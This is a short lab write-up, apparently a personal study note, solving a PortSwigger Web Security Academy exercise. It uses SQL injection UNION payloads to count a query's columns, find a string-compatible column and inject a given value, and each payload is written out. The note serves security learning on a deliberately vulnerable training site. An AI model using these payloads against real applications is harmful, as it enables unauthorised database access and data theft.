[Source](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)
## Task
This exercise contains a SQL injection vulnerability in the product category filter. The query results are returned in the application response, so we can use a `UNION` attack to extract data from other tables. To build such an attack, we first need to determine the number of columns returned by the query. This can be done using the technique learned in the previous exercise. The next step is to determine the column that is compatible with string data.

The exercise will provide a random value that needs to be forced to appear in the query results. To solve the task, perform a SQL injection attack using the `UNION` operator, which will return an additional row with the provided value. This technique will help you determine which columns are compatible with string data.
## Solution
Go to the site
![[Pasted image 20241201183252.png]]
Select any category (I chose `Lifestyle`). Find how many columns there are in total:
```SQL
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
etc.
```
I found 3.
In `URL` we add
```SQL
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL, NULL,'a'--
```
The correct one here is `' UNION SELECT NULL,'a',NULL--`
![[Pasted image 20241201184201.png]]
The task on the site page says that you need to output the string `Ra0nUk` this way
```SQL
' UNION SELECT NULL,'Ra0nUk',NULL--
```
![[Pasted image 20241201184316.png]]